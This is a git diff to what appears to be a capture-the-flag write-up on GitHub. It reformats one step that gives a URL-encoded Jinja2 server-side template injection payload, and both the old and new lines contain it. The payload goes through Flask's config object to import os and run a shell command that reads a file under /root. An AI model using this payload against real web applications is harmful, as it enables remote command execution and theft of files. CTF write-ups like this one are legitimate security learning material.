@@ -20,8 +20,8 @@
 
 ![image](https://github.com/nhattanhh/CTF/assets/130430279/51420a89-50c3-43e4-83b8-366c31ab4ee6)
 
-- So use this payload to get the flag, flag will be hidden in ~/root/flag.txt~
+- So use this payload to get the flag, flag will be hidden in %/root/flag.txt%
 
-- #%7B%7B%20config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd%20..;cd%20root;cat%20flag.txt").read()%20%7D%7D#
+- //%7B%7B%20config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd%20..;cd%20root;cat%20flag.txt").read()%20%7D%7D//
 
 ![image](https://github.com/nhattanhh/CTF/assets/130430279/0bec9bd2-1c5b-437c-8ebc-2ea1cdf3c4d5)
